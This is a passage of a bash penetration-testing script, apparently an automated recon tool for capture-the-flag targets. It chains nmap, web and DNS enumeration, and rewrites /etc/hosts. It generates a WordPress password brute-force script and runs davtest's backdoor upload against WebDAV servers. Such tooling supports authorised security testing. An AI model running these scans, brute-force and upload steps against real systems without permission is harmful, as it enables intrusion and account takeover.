#!/usr/bin/env bash

banner1() {

    echo -e "\e[1;94m   _____________          ____    ________________                               \e[0m"
    echo -e "\e[1;94m  /___/___      \        /  / |  /___/__          \                   _____      \e[0m"
    echo -e "\e[1;94m      /  /   _   \______/__/  |______|__|_____ *   \_________________/__/  |___  \e[0m"
    echo -e "\e[1;94m   __/__/   /_\   \ |  |  \   __\/  _ \|  |       __/ __ \_/ ___\/  _ \|       | \e[0m"
    echo -e "\e[1;94m  |   |     ___    \|  |  /|  | (  |_| )  |    |   \  ___/\  \__(  |_| )   |   | \e[0m"
    echo -e "\e[1;94m  |___|____/\__\____|____/_|__|\_\____/|__|____|_  /\___  |\___  \____/|___|  /  \e[0m"
    echo -e "\e[1;94m                                             \___\/  \__\/  \___\/      \___\/   \e[0mv4.0"
    echo -e "\e[1;77m\e[45m         AUTO RECON by github.com/Knowledge-Wisdom-Understanding                        \e[0m"
    echo -e ""

}

DOPE='\e[1;32;92m[+]\e[0m'
NOTDOPE='\e[31m[+]\e[0m'
MANUALCMD='\e[1;32;93m[+]\e[0m'
TEAL='\e[96m'
YELLOW='\e[93m'
END='\e[0m'

helpFunction() {
    echo -e "${DOPE} Usage: $0 [options...] <Target-IP>"
    echo " "
    echo " -h, --help         Show Usage and command arguments"
    echo " "
    echo " -t, --target       Scan a single host"
    echo " "
    echo " -a, --all          Scan The Entire Subnet!"
    echo " "
    echo " -H, --HTB          Scan Single Target and check for .htb domains"
    echo " "
    echo " -f, --file         Scan all hosts from a file of IP Addresses separated 1 per line"
    echo " "
    echo " -v, --version      Show Version Information"
    if [ -n "$1" ]; then
        exit "$1"
    fi
}

exitFunction() {
    echo "ERROR: Unrecognized argument: $1" >&2
    helpFunction 1
}

# Error Cases
arg=("$@")
if [ -z "$1" ]; then
    exitFunction
elif [ "$#" -lt 1 ]; then
    exitFunction
elif [ "$#" -gt 2 ]; then
    exitFunction
else
    rhost=${arg[1]}
fi

SECONDS=0

validate_IP() {
    if [[ $rhost =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        :
    else
        echo -e "\e[31m[+]\e[0m NOT A VALID IP ADDRESS"
        exit 1
    fi
}

# Function Definitions
getUpHosts() {
    baseip=$(echo $rhost | cut -d "." -f1-3)
    cidr_range=$(echo $baseip".0")
    echo -e "${DOPE} Scanning Subnet..."
    nmap -sn $cidr_range/24 -oG /tmp/live-hosts.txt >/dev/null
    cat /tmp/live-hosts.txt | grep "Up" | cut -d " " -f2 >live-hosts-ip.txt
    rm /tmp/live-hosts.txt
    echo -e "${DOPE} Live Hosts Recon On $cidr_range/24 Done!"
    cat live-hosts-ip.txt
}

Open_Ports_Scan() {
    echo -e "${DOPE} Scanning $rhost"
    create_nmap_dir() {
        if [ -d nmap ]; then
            :
        else
            mkdir -p nmap
        fi
    }
    create_nmap_dir
    create_wordlists_dir() {
        if [ -d wordlists ]; then
            :
        else
            mkdir -p wordlists
        fi
    }
    create_wordlists_dir
    create_manual_dir() {
        if [ -d manual-commands ]; then
            :
        else
            mkdir -p manual-commands
        fi
    }
    create_manual_dir
    create_web_dir() {
        if [ -d WEB ]; then
            :
        else
            mkdir -p WEB
        fi
    }
    create_web_dir
    nmap -vv -Pn -sV -T3 --max-retries 1 --max-scan-delay 20 --top-ports 10000 -oA nmap/top-ports-$rhost $rhost
    grep -v "filtered" nmap/top-ports-$rhost.nmap | grep open | cut -d "/" -f 1 >top-open-ports.txt
    grep -v "filtered" nmap/top-ports-$rhost.nmap | grep open >top-open-services.txt
}

Enum_Web() {
    grep -v "ssl" top-open-services.txt | grep -v "proxy" | grep -v "RPC" | grep -v "(SSDP/UPnP)" | grep -E "http|BaseHTTPServer" | cut -d "/" -f 1 >httpports-$rhost.txt
    if [[ -s httpports-$rhost.txt ]]; then
        portfilename=httpports-$rhost.txt
        # echo $portfilename
        httpPortsLines=$(cat $portfilename)
        cwd=$(pwd)
        if grep -q "|_http-title: Did not follow redirect" nmap/http-vuln-enum-scan.nmap; then
            redirect_domain=$(grep -i "|_http-title: Did not follow redirect" nmap/http-vuln-enum-scan.nmap | cut -d " " -f 7 | sed -e "s/[^/]*\/\/\([^@]*@\)\?\([^:/]*\).*/\2/")
            echo -e "${DOPE} Target is redirecting to domain: $redirect_domain"
            echo -e "${DOPE} Creating backup of /etc/hosts file in $cwd"
            cat /etc/hosts >etc-hosts-backup
            echo -e "${DOPE} Adding $redirect_domain to /etc/hosts file"
            if grep -q "$rhost" /etc/hosts; then
                :
            else
                sed -i $"3i$rhost\t$redirect_domain" /etc/hosts
            fi
            unset rhost
            rhost=$redirect_domain
        else
            :
        fi
        for port in $httpPortsLines; do
            wordlist="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
            wordlist3="/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"
            # wordlist2="/usr/share/seclists/Discovery/Web-Content/common.txt"
            echo -e "${DOPE} Running The Following Commands"
            # echo -e "${DOPE} gobuster dir -u http://$rhost:$port -w $wordlist -l -t 50 -x .html,.php,.asp,.aspx,.txt -e -k | tee gobuster-$rhost-$port.txt"
            # echo -e "${DOPE} uniscan -u http://$rhost:$port/ -qweds"
            echo -e "${DOPE} whatweb -v -a 3 http://$rhost:$port | tee whatweb-color-$rhost-$port.log"
            whatweb -v -a 3 http://$rhost:$port | tee whatweb-color-$rhost-$port.log
            # Removing color from output log
            sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" whatweb-color-$rhost-$port.log >whatweb-$rhost-$port.log && rm whatweb-color-$rhost-$port.log
            echo -e "${DOPE} Checking for Web Application Firewall... wafw00f http://$rhost:$port/"
            wafw00f http://$rhost:$port/ | tee wafw00f-color-$rhost-$port.log
            # Removing color from output log
            sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" wafw00f-color-$rhost-$port.log >wafw00f-$rhost-$port.log
            rm wafw00f-color-$rhost-$port.log
            echo -e "${DOPE} curl -sSik http://$rhost:$port/robots.txt -m 10 -o robots-$rhost-$port.txt &>/dev/null"
            curl -sSik http://$rhost:$port/robots.txt -m 10 -o robots-$rhost-$port.txt &>/dev/null
            # gobuster dir -u http://$rhost:$port -w $wordlist -l -t 50 -x .html,.php,.asp,.aspx,.txt -e -k -o gobuster-$rhost-$port.txt 2>/dev/null
            ####################################################################################
            mkdir -p eyewitness-report-"$rhost"-"$port" && cd /opt/EyeWitness
            echo http://"$rhost":"$port" >eyefile.txt
            echo -e "${DOPE} ./EyeWitness.py --threads 5 --ocr --no-prompt --active-scan --all-protocols --web -f eyefile.txt -d $cwd/eyewitness-report-$rhost-$port"
            ./EyeWitness.py --threads 5 --ocr --no-prompt --active-scan --all-protocols --web -f eyefile.txt -d $cwd/eyewitness-report-$rhost-$port
            cd - &>/dev/null
            ##################################################################################
            echo -e "${DOPE} python3 /opt/dirsearch/dirsearch.py -u http://$rhost:$port -t 80 -e php,asp,aspx,txt-x 403 -f --plain-text-report dirsearch-$rhost-$port.log"
            python3 /opt/dirsearch/dirsearch.py -u http://$rhost:$port -t 80 -e php,asp,aspx,txt -x 403 -f --plain-text-report dirsearch-$rhost-$port.log
            echo -e "${DOPE} python3 /opt/dirsearch/dirsearch.py -u http://$rhost:$port -t 80 -e php,asp,aspx,txt,html -w $wordlist -x 403 --plain-text-report dirsearch-dlistmedium-$rhost-$port.log"
            python3 /opt/dirsearch/dirsearch.py -u http://$rhost:$port -t 80 -e php,asp,aspx,txt,html -w $wordlist -x 403 --plain-text-report dirsearch-dlistmedium-$rhost-$port.log
            echo -e "${DOPE} Running nikto as a background process to speed things up."
            echo -e "${DOPE} nikto -ask=no -host http://$rhost:$port >niktoscan-$rhost-$port.txt 2>&1 &"
            nikto -ask=no -host http://$rhost:$port >niktoscan-$rhost-$port.txt 2>&1 &
            # uniscan -u http://$rhost:$port -qweds
            echo -e "${DOPE} Further Web enumeration Commands to Run: "
            echo -e "${MANUALCMD} uniscan -u http://$rhost:$port -qweds" | tee -a manual-commands.txt
            # echo -e "${MANUALCMD} python3 /opt/dirsearch/dirsearch.py -u http://$rhost:$port -w $wordlist -e php,asp,aspx,html,txt,js -x 403 -t 80 --plain-text-report dirsearch-dlistmedium-$rhost-$port.log" | tee -a manual-commands.txt
            wp1=$(grep -i "WordPress" whatweb-$rhost-$port.log 2>/dev/null)
            wp2=$(grep -i "wp-" nmap/http-vuln-enum-scan.nmap)
            if [[ $wp1 ]] || [[ $wp2 ]]; then
                echo -e "${DOPE} Found WordPress! Running wpscan --no-update --url http://$rhost:$port/ --wp-content-dir wp-content --enumerate vp,vt,cb,dbe,u,m --plugins-detection aggressive | tee -a wpscan-$rhost-$port.log"
                wpscan --no-update --url http://$rhost:$port/ --wp-content-dir wp-content --enumerate vp,vt,cb,dbe,u,m --plugins-detection aggressive | tee wpscan-$rhost-$port.log
                # echo -e "${DOPE} 1 sleeping for 5 seconds to wait for wpscan process id :)"
                echo -e "${DOPE} Creating manual WordPress Brute-Force Script!"
                cat >wpBrute.sh <<EOF
#!/bin/bash

if [[ -n \$(grep -i "User(s) Identified" wpscan-$rhost-$port.log) ]]; then
    grep -w -A 100 "User(s)" wpscan-$rhost-$port.log | grep -w "[+]" | cut -d " " -f 2 | head -n -7 >wp-users.txt
    # create wordlist from web-page with cewl
    cewl http://$rhost:$port/ -m 3 -w cewl-list.txt
    sleep 10
    # add john rules to cewl wordlist
    echo -e "${DOPE} Adding John Rules to Cewl Wordlist!"
    john --rules --wordlist=cewl-list.txt --stdout >john-cool-list.txt
    # brute force again with wpscan
    sleep 3
    wpscan --url http://$rhost:$port/ --wp-content-dir wp-login.php -U wp-users.txt -P cewl-list.txt threads 50 | tee wordpress-cewl-brute.txt
    sleep 5
    if grep -i "No Valid Passwords Found" wordpress-cewl-brute.txt 2>/dev/null; then
        if [ -s john-cool-list.txt ]; then
            wpscan --url http://$rhost:$port/ --wp-content-dir wp-login.php -U wp-users.txt -P john-cool-list.txt threads 50 | tee wordpress-john-cewl-brute.txt
        else
            echo "john wordlist is empty :("
        fi
    fi
    sleep 5
    if grep -i "No Valid Passwords Found" wordpress-john-cewl-brute.txt 2>/dev/null; then
        wpscan --url http://$rhost:$port/ --wp-content-dir wp-login.php -U wp-users.txt -P /usr/share/wordlists/fasttrack.txt threads 50 | tee wordpress-fasttrack-brute.txt
    fi
fi
EOF
                chmod +x wpBrute.sh
            elif grep -i "Drupal" whatweb-$rhost-$port.log 2>/dev/null; then
                echo -e "${DOPE} Found Drupal! Running droopescan scan drupal -u http://$rhost -t 32 | tee drupalscan-$rhost-$port.log"
                droopescan scan drupal -u http://$rhost:$port/ -t 32 | tee drupalscan-$rhost-$port.log
            elif grep -i "Joomla" whatweb-$rhost-$port.log 2>/dev/null; then
                echo -e "${DOPE} Found Joomla! Running joomscan --url http://$rhost/ -ec | tee joomlascan-$rhost-$port.log"
                joomscan --url http://$rhost:$port/ -ec | tee joomlascan-$rhost-$port.log
            elif [[ $(grep -i "WebDAV" whatweb-$rhost-$port.log 2>/dev/null) ]] || [[ $(grep -w "PUT" nmap/http-vuln-enum-scan.nmap) ]]; then
                echo -e "${DOPE} Found WebDAV! Running davtest -move -sendbd auto -url http://$rhost:$port/ | tee davtestscan-$rhost-$port.log"
                davtest -move -sendbd auto -url http://$rhost:$port/ | tee davtestscan-$rhost-$port.log
                echo -e "${DOPE} nmap -Pn -v -sV -p $port --script=http-iis-webdav-vuln.nse -oA nmap/webdav $rhost"
                nmap -Pn -v -sV -p $port --script=http-iis-webdav-vuln.nse -oA nmap/webdav $rhost
            elif grep -i "tomcat" top-open-services.txt 2>/dev/null; then
                grep -i "tomcat" top-open-services.txt | cut -d "/" -f 1 >current-tomcat-port.txt
                tcatportFile=current-tomcat-port.txt
                tcatport=$(cat $tcatportFile)
                gtcatport=$(echo $tcatport)
                if [[ $port -eq "$gtcatport" ]]; then
                    echo -e "${DOPE} Found TomCat! Running: gobuster dir -u http://$rhost:$port -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt -l -t 50 -x .html,.php,.asp,.aspx,.txt,.js -e -k -o gobuster-$rhost-$port.txt"
                    gobuster dir -u http://$rhost:$port -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt -l -t 50 -x .html,.php,.asp,.aspx,.txt,.js -e -k -o gobuster-$rhost-$port.txt
                    rm current-tomcat-port.txt
                else
                    :
                fi
            elif grep -i "magento" whatweb-$rhost-$port.log 2>/dev/null; then
                echo -e "${DOPE} Found Magento! Running /opt/magescan/bin/magescan scan:all http://$rhost/ | tee magescan-$rhost-$port.log"
                cd /opt/magescan
                bin/magescan scan:all http://$rhost:$port/ | tee magento-$rhost-$port.log
                cd - &>/dev/null
                echo -e "${MANUALCMD} Consider crawling site: python3 /opt/dirsearch/dirsearch.py -u http://$rhost:$port -w /usr/share/seclists/Discovery/Web-Content/CMS/sitemap-magento.txt -e php,asp,aspx,txt,html -t 80 -x 403,401,404,500 --plain-text-report dirsearch-magento-$rhost-$port.log" | tee -a manual-commands.txt
            else
                :
            fi
        done
        if [[ -n $redirect_domain ]]; then
            unset rhost
            rhost=${arg[1]}
        else
            :
        fi
    fi
}

Web_Vulns() {
    grep -v "ssl" top-open-services.txt | grep -v "proxy" | grep -v "RPC" | grep -v "UPnP" | grep -E "http|BaseHTTPServer" | cut -d "/" -f 1 >openports-web-$rhost.txt
    if [[ -s openports-web-$rhost.txt ]]; then
        echo -e "${DOPE} Running nmap http vuln-scan on all open http ports!"
        nmap -vv -Pn -sC -sV -p $(tr '\n' , <openports-web-$rhost.txt) -oA nmap/http-vuln-enum-scan $rhost
    fi
}

Web_Proxy_Scan() {
    grep -v "ssl" top-open-services.txt | grep -E "http-proxy|Squid" | cut -d "/" -f 1 >openports-webproxies-$rhost.txt
    proxyPort=$(grep -v "ssl" top-open-services.txt | grep -E "http-proxy|Squid" | cut -d "/" -f 1)
    if [[ -s openports-webproxies-$rhost.txt ]]; then
        echo -e "${DOPE} Found http-proxy at http://$rhost:$proxyPort"
        echo -e "${DOPE} Adding proxy port to /etc/proxychains.conf"
        if grep -i "$rhost" /etc/proxychains.conf; then
            :
        else
            echo "http $rhost $proxyPort" >>/etc/proxychains.conf
        fi
        echo -e "${DOPE} Running NMAP scan through http proxy"
        echo -e "${DOPE} proxychains nmap -vv -Pn -sV -T3 --max-retries 1 --max-scan-delay 20 --top-ports 10000 -oA nmap/proxychainScanTopPorts 127.0.0.1"
        proxychains nmap -vv -sT -Pn -sV -T3 --max-retries 1 --max-scan-delay 20 --top-ports 10000 -oA nmap/proxychainScanTopPorts 127.0.0.1
        grep -v "filtered" nmap/proxychainScanTopPorts.nmap | grep open | cut -d "/" -f 1 >top-proxy-open-ports.txt
        grep -v "filtered" nmap/proxychainScanTopPorts.nmap | grep open >top-proxy-open-services.txt
        echo -e "${DOPE} proxychains nmap -vv -sT -Pn -sC -sV -p $(tr '\n' , <top-proxy-open-ports.txt) -oA nmap/proxychainServiceScan 127.0.0.1"
        proxychains nmap -vv -sT -Pn -sC -sV -p $(tr '\n' , <top-proxy-open-ports.txt) -oA nmap/proxychainServiceScan 127.0.0.1
        grep -v "ssl" top-proxy-open-services.txt | grep -v "proxy" | grep -v "RPC" | grep -v "(SSDP/UPnP)" | grep -E "http|BaseHTTPServer" | cut -d "/" -f 1 >http-proxy-ports-$rhost.txt
        proxyPortfilename=http-proxy-ports-$rhost.txt
        httpProxyPortsLines=$(cat $proxyPortfilename)
        if [[ -s http-proxy-ports-$rhost.txt ]]; then
            for webPort in $httpProxyPortsLines; do
                echo -e "${DOPE} whatweb -v -a 3 --proxy $rhost:$proxyPort http://127.0.0.1:$webPort/"
                whatweb -v -a 3 --proxy $rhost:$proxyPort http://127.0.0.1:$webPort/ | tee whatweb-color-proxy-$rhost-$webPort.log
                sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" whatweb-color-proxy-$rhost-$webPort.log >whatweb-proxy-$rhost-$webPort.log && rm whatweb-color-proxy-$rhost-$webPort.log
                echo -e "${DOPE} python3 /opt/dirsearch/dirsearch.py -e php,asp,aspx,html,txt -x 403 -t 50 --proxy $rhost:$proxyPort -u http://127.0.0.1:$webPort/ --plain-text-report proxy-default-crawl-$rhost-$webPort-$proxyPort.log"
                python3 /opt/dirsearch/dirsearch.py -e php,asp,aspx,txt -f -x 403 -t 50 --proxy $rhost:$proxyPort -u http://127.0.0.1:$webPort/ --plain-text-report proxy-default-crawl-$rhost-$webPort-$proxyPort.log
                echo -e "${DOPE} python3 /opt/dirsearch/dirsearch.py -e php,asp,aspx,html,txt -x 403 -t 50 --proxy $rhost:$proxyPort -u http://127.0.0.1:$webPort/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --plain-text-report proxy-dlistsmall-$rhost-$webPort-$proxyPort.log"
                python3 /opt/dirsearch/dirsearch.py -e php,asp,aspx,html,txt -x 403 -t 50 --proxy $rhost:$proxyPort -u http://127.0.0.1:$webPort/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --plain-text-report proxy-dlistsmall-$rhost-$webPort-$proxyPort.log
                echo -e "${DOPE} nikto -ask=no -host http://127.0.0.1:$webPort/ -useproxy http://$rhost:$proxyPort/ -output nikto-$rhost-$webPort-scan.txt"
                nikto -ask=no -host http://127.0.0.1:$webPort/ -useproxy http://$rhost:$proxyPort/ -output nikto-$rhost-$webPort-scan.txt
                wp3=$(grep -i "wordpress" proxy-big-crawl-$rhost-$webPort-$proxyPort.log)
                wp4=$(grep -i "wordpress" whatweb-proxy-$rhost-$webPort.log)
                wordpressURL=$(grep -i "wordpress" proxy-big-crawl-$rhost-$webPort-$proxyPort.log | awk '{print $3}' | head -n 1)
                if [[ $wp3 ]] || [[ $wp4 ]]; then
                    echo -e "${DOPE} Found WordPress!"
                    if [[ -n $wordpressURL ]]; then
                        echo -e "${DOPE} wpscan --no-update --url $wordpressURL --enumerate vp,vt,cb,dbe,u,m --plugins-detection aggressive --proxy http://$rhost:$proxyPort"
                        wpscan --no-update --url $wordpressURL --enumerate vp,vt,cb,dbe,u,m --plugins-detection aggressive --proxy http://$rhost:$proxyPort | tee wpscan-$rhost-$webPort-$proxyPort.log
                    else
                        echo -e "${DOPE} wpscan --no-update --url http://127.0.0.1:$webPort/ --enumerate vp,vt,cb,dbe,u,m --plugins-detection aggressive --proxy http://$rhost:$proxyPort"
                        wpscan --no-update --url http://127.0.0.1:$webPort/ --enumerate vp,vt,cb,dbe,u,m --plugins-detection aggressive --proxy http://$rhost:$proxyPort | tee wpscan-$rhost-$webPort-$proxyPort.log
                    fi
                elif grep -i "Drupal" whatweb-proxy-$rhost-$webPort.log 2>/dev/null; then
                    echo -e "${DOPE} Found Drupal! Running droopescan scan drupal -u http://127.0.0.1:$webPort/ -t 32 | tee drupalscan-$rhost-$webPort.log"
                    proxychains droopescan scan drupal -u http://127.0.0.1:$webPort/ -t 32 | tee drupalscan-$rhost-$webPort.log
                elif grep -i "Joomla" whatweb-proxy-$rhost-$webPort.log 2>/dev/null; then
                    echo -e "${DOPE} Found Joomla! Running joomscan --url http://$rhost/ -ec | tee joomlascan-$rhost-$webPort.log"
                    joomscan --url http://127.0.0.1:$webPort/ -ec --proxy http://$rhost:$proxyPort | tee joomlascan-$rhost-$webPort.log
                elif [[ $(grep -i "WebDAV" whatweb-proxy-$rhost-$webPort.log 2>/dev/null) ]] || [[ $(grep -w "PUT" nmap/proxychainServiceScan.nmap) ]]; then
                    echo -e "${DOPE} Found WebDAV! Running davtest -move -sendbd auto -url http://$rhost:$webPort/ | tee davtestscan-$rhost-$webPort.log"
                    proxychains davtest -move -sendbd auto -url http://127.0.0.1:$webPort/ | tee davtestscan-$rhost-$webPort.log
                    echo -e "${DOPE} nmap -Pn -v -sV -p $webPort --script=http-iis-webdav-vuln.nse -oA nmap/webdav $rhost"
                    proxychains nmap -sT -Pn -v -sV -p $webPort --script=http-iis-webdav-vuln.nse -oA nmap/webdav $rhost
                elif grep -i "magento" whatweb-proxy-$rhost-$webPort.log 2>/dev/null; then
                    echo -e "${DOPE} Found Magento! Running /opt/magescan/bin/magescan scan:all http://$rhost/ | tee magescan-$rhost-$webPort.log"
                    cd /opt/magescan
                    proxychains bin/magescan scan:all -n http://127.0.0.1:$webPort/ | tee magento-$rhost-$webPort.log
                    cd - &>/dev/null
                    echo -e "${DOPE} Consider crawling site [+]"
                    echo -e "${DOPE} python3 /opt/dirsearch/dirsearch.py -u http://$rhost:$webPort -w /usr/share/seclists/Discovery/Web-Content/CMS/sitemap-magento.txt -e php,asp,aspx,txt,html -t 80 -x 403,401,404,500 --plain-text-report dirsearch-magento-$rhost-$webPort.log"
                else
                    :
                fi
            done
            cat proxy*.log | grep -Ev "500|403|400|401|503" | awk '{print $3}' | sort -u >snProxyURLs.txt
            urlProxyPorts=$(cat http-proxy-ports-$rhost.txt | tr '\n' ',')
            formattedUrlProxyPorts=$(echo "${urlProxyPorts::-1}")
            cat snProxyURLs.txt | aquatone -ports $formattedUrlProxyPorts -proxy http://$rhost:$proxyPort -out proxy_aquatone -screenshot-timeout 40000
            rm snProxyURLs.txt
        fi
    fi
}

ssl_dns_enum() {
    cwd=$(pwd)
    echo -e "${DOPE} dig -x $rhost"
    dig -x $rhost @"$rhost" | tee dig-$rhost-$port.txt
    cat sslscan-$rhost-$port.log | grep "Subject" | awk '{print $2}' >domain.txt
    domainName=$(grep "Subject" sslscan-$rhost-$port.log | awk '{print $2}')
    altDomainNames=$(grep "Altnames" sslscan-$rhost-$port.log | grep "Altnames" | sed 's/, DNS:/ /g' | sed -n -e 's/^.*DNS://p')
    if [[ -n $altDomainNames ]] && [[ -n $domainName ]]; then
        echo -e "$domainName $altDomainNames" | tr ' ' '\n' >domains.txt
        cp -r domains.txt domains.txt.bak
        allDomains2=$(echo -e "$domainName $altDomainNames" | tr ' ' '\n')
    fi
    if [[ -s domain.txt ]] && [[ -s domains.txt ]]; then
        wildcards=('*' '?' '|')
        for wildcard in "${wildcards[@]}"; do
            for dnsname in $allDomains2; do
                if [[ $dnsname == *"${wildcard}"* ]]; then
                    domainNoWildcard=$(echo "${dnsname#'*.'}")
                    sed -i "s/$dnsname/$domainNoWildcard/g" domains.txt
                else
                    :
                fi
            done

            if [[ $domainName == *"${wildcard}"* ]]; then
                domainNoWildcard=$(echo "${domainName#'*.'}")
                echo -e "${DOPE} Removing wildcard from $domainName .. Setting domain to $domainNoWildcard"
                unset domainName
                domainName="$domainNoWildcard"
            else
                :
            fi
        done
        allDomainsFile=domains.txt
        loopAllDomainsFile=$(cat $allDomainsFile)
        for dnsname2 in $loopAllDomainsFile; do
            if [[ $dnsname2 == "$domainName" ]]; then
                :
            elif grep -e "$rhost.*$dnsname2" /etc/hosts; then
                :
            elif [[ $rhost == 127.0.0.1 ]]; then
                :
            elif ! grep -q "$rhost" /etc/hosts; then
                sed -i $"3i$rhost\t$domainName" /etc/hosts
                sed -i "/$domainName/ s/$/ $dnsname2/" /etc/hosts
            else
                echo -e "${DOPE} Adding $dnsname2 to /etc/hosts file"
                sed -i "/$domainName/ s/$/ $dnsname2/" /etc/hosts
            fi
        done
        for dnsname3 in $loopAllDomainsFile; do
            if [[ $dnsname3 == "$domainName" ]]; then
                :
            else
                echo -e "${MANUALCMD} Creating Manual DNS Enum Bash Script for $dnsname3"
                cat >enum-$dnsname3.sh <<EOF
#!/bin/bash

echo -e "${DOPE} whatweb -v -a 3 https://$dnsname3:$port | tee whatweb-color-$dnsname3-$port.log"
whatweb -v -a 3 https://$dnsname3:$port | tee whatweb-color-$dnsname3-$port.log
sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" whatweb-color-$dnsname3-$port.log >whatweb-ssl-$dnsname3-$port.log && rm whatweb-color-$dnsname3-$port.log
curl -sSik https://$dnsname3:$port/robots.txt -m 10 -o robots-$dnsname3-$port.txt &>/dev/null
echo -e "${DOPE} python3 /opt/dirsearch/dirsearch.py -u https://$dnsname3:$port -t 80 -e php,asp,aspx,txt,html -f -x 403 --plain-text-report SSL-dirsearch-$dnsname3-$port.log"
python3 /opt/dirsearch/dirsearch.py -u https://$dnsname3:$port -t 80 -e php,asp,aspx,txt -f -x 403 --plain-text-report SSL-dirsearch-$dnsname3-$port.log
echo -e "${DOPE} python3 /opt/dirsearch/dirsearch.py -u https://$dnsname3:$port -t 80 -e php,asp,aspx,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x 403 --plain-text-report SSL-dirsearch-dlistsmall-$dnsname3-$port.log"
python3 /opt/dirsearch/dirsearch.py -u https://$dnsname3:$port -t 80 -e php,asp,aspx,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x 403 --plain-text-report SSL-dirsearch-dlistsmall-$dnsname3-$port.log
echo -e "${DOPE} Running nikto as a background process to speed things up"
echo -e "${DOPE} nikto -ask=no -host https://$dnsname3:$port -ssl >niktoscan-$dnsname3-$port.txt 2>&1 &"
nikto -ask=no -host https://$dnsname3:$port -ssl >niktoscan-$dnsname3-$port.txt 2>&1 &
echo -e "${DOPE} gobuster dns -d $dnsname3 -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -t 80 -o gobust-$dnsname3.log"
gobuster dns -d $dnsname3 -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -t 80 -o gobust-$dnsname3.log
EOF
                chmod +x enum-$dnsname3.sh
            fi
        done
    elif [[ -s domain.txt ]] && [[ ! -s domains.txt ]]; then
        wildcards=('*' '?' '|')
        for wildcard in "${wildcards[@]}"; do
            if [[ $domainName == *"${wildcard}"* ]]; then
                domainNoWildcard=$(echo "${domainName#'*.'}")
                echo -e "${DOPE} Removing wildcard from $domainName .. Setting domain to $domainNoWildcard"
                unset domainName
                domainName="$domainNoWildcard"
            else
                :
            fi
        done
    fi
    if [[ -s domain.txt ]] && [[ -n $domainName ]] && [[ $domainName != "localhost" ]]; then
        set -- $domainName
        echo -e "${DOPE} Target has domain: $domainName"
        echo -e "${DOPE} Creating backup of /etc/hosts file in $cwd"
        cat /etc/hosts >etc-hosts-backup2.txt
        if [[ $rhost == 127.0.0.1 ]]; then
            :
        elif grep -e "$rhost.*$domainName" /etc/hosts; then
            :
        else
            echo -e "${DOPE} Adding $domainName to /etc/hosts file"
            sed -i $"3i$rhost\t$domainName" /etc/hosts
        fi
        echo -e "${DOPE} Checking for Zone Transfer on $rhost:$port $domainName"
        echo -e "${DOPE} dig axfr @$rhost $domainName"
        dig axfr @$rhost $domainName | tee zone-transfer-$rhost-$port-$domainName.txt
        if grep -q "$domainName" zone-transfer-$rhost-$port-$domainName.txt; then
            grep -v ";" zone-transfer-$rhost-$port-$domainName.txt | grep -v -e '^[[:space:]]*$' >filtered-zone-transfer-$rhost-$port-$domainName.txt
            allDomains=$(cat filtered-zone-transfer-$rhost-$port-$domainName.txt | awk '{print $1}')
            domainDot=$(echo $domainName".")
            for dmain in $allDomains; do
                if [[ $domainDot == "$dmain" ]]; then
                    :
                else
                    dmainMinusDot=$(echo "${dmain:0:-1}")
                    if grep -q "$dmainMinusDot" /etc/hosts; then
                        :
                    elif [[ $rhost == 127.0.0.1 ]]; then
                        :
                    else
                        sed -i "/$domainName/ s/$/ $dmainMinusDot/" /etc/hosts
                    fi
                fi
            done
            echo -e "${YELLOW}#################################################################################################### ${END}"
            cat /etc/hosts

        fi
        curl -sSik https://$rhost:$port -m 10 -o homepage-source.html &>/dev/null
        sed -n 's/.*href="\([^"]*\).*/\1/p' homepage-source.html >links.txt
        cat links.txt | sed -e "s/[^/]*\/\/\([^@]*@\)\?\([^:/]*\).*/\2/" >urls.txt
        urlsList=urls.txt
        loopUrlsList=$(cat $urlsList)
        if [[ -s urls.txt ]]; then
            for url in $loopUrlsList; do
                if [[ $url == *".htb" ]]; then
                    echo "${DOPE} found .htb domain: $url "
                    if grep -e "$rhost.*$domainName" /etc/hosts; then
                        if grep -q "$url" /etc/hosts; then
                            :
                        else
                            echo "${DOPE} Adding $url to /etc/hosts file"
                            sed -i "/$domainName/ s/$/ $url/" /etc/hosts
                        fi
                    else
                        :
                    fi
                else
                    :
                fi
            done
            echo -e "${YELLOW}#################################################################################################### ${END}"
            cat /etc/hosts
        fi
        if [[ $domainName == *".htb"* ]]; then
            if [[ $(grep "domain" top-open-services.txt) ]] || [[ $(grep -w "53" top-open-ports.txt) ]]; then
                echo -e "${DOPE} dnsrecon -d $domainName"
                dnsrecon -d $domainName | tee dnsrecon-$rhost-$domainName.log
                echo -e "${DOPE} dnsenum --dnsserver $rhost --enum -f /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -r $domainName"
                dnsenum --dnsserver $rhost --enum -f /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -r $domainName | tee dnsenum-$rhost-$domainName.log
            fi
            echo -e "${DOPE} gobuster dns -d $domainName -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -t 80 -o gobust-$domainName.log"
            gobuster dns -d $domainName -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -t 80 -o gobust-$domainName.log
            echo -e "${MANUALCMD} wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -u $domainName -H 'Host: FUZZ.$domainName' " | tee -a manual-commands.txt
            # wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -u $domainName -H "Host: FUZZ.$domainName" --hw 717 --hc 404 -o raw | tee wfuzz-dns-$domainName.txt
        else
            echo -e "${DOPE} Running DNS Enumeration on $domainName"
            echo -e "${DOPE} dnsrecon -d $domainName | tee dnsrecon-$rhost-$domainName.log"
            dnsrecon -d $domainName | tee dnsrecon-$rhost-$domainName.log
            reconDir=$(echo $cwd)
